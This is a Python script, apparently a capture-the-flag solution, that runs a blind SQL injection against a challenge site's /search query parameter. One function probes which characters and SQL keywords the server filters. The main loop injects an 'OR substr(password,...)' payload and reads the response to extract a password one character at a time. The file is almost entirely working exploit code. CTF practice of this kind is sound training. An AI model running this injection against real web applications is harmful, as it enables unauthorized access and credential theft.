#!/usr/bin/env python3

import pwn as p
import requests as r
import string

url, port = p.args.URL or str("http://challenges.shutlock.fr"), p.args.PORT or int(
    50000
)
debug = p.args.TEST or False
http_proxy = "http://localhost:8080"
https_proxy = "http://localhost:8080"

proxies = {"http": http_proxy, "https": https_proxy}
uri = "/search"
module = "?query="
alphabet = string.ascii_uppercase + string.digits


def test():
    alphabet = string.printable
    OK = []
    NOK = []
    SQL = [
        "select",
        "SeLEct",
        "where",
        "union",
        "unIon",
        "and",
        "aNd",
        "or",
        "Or",
        "o+r",
        "substring",
        "substr",
        "suBstr",
        "like",
        "by",
        "asc",
        "desc",
        "from",
        "having",
        "||",
        "&&",
    ]
    for car in alphabet:
        # reponse = r.get(url + ":" + str(port) + uri + module + f"{car}")
        reponse = r.get(f"{url}:{port}{uri}{module}{car}")
        print(f"testing {car}", end="\r")
        if reponse.status_code == 200:
            OK += car
        else:
            NOK += car

    if alphabet == OK:
        p.success("il n'y a aucune restriction")
    else:
        p.warn(f"attention, uniquement la liste suivante est refus√©e {NOK}")

    OK = []
    NOK = []
    for verbe in SQL:
        reponse = r.get(f"{url}:{port}{uri}{module}{verbe}")
        print(f"testing {verbe}", end="\r")
        if reponse.status_code == 200:
            OK += [verbe]
        else:
            NOK += [verbe]
    if NOK:
        p.warn(f"attention, les verbes suivants sont interdit: {NOK!s}")


def main():
    password = ""
    inc = 1
    loop = True
    while loop:
        count = 0
        for car in alphabet:
            print(f"testing {password}{car}", end="\r")
            reponse = r.get(f"{url}:{port}{uri}{module}xxxxx%25'+oR+subStr(passWorD,{inc},1)='{car}'+oR+'x'='xx")
            if str("Found 1 result") in reponse.text:
                password += car
                inc +=1
                break
            count += 1

            if count == len(alphabet):
                print(f"{password=!s}")
                loop = False
            else:
                continue


if __name__ == "__main__":
    if debug:
        print("mode debug")
        test()
    else:
        main()
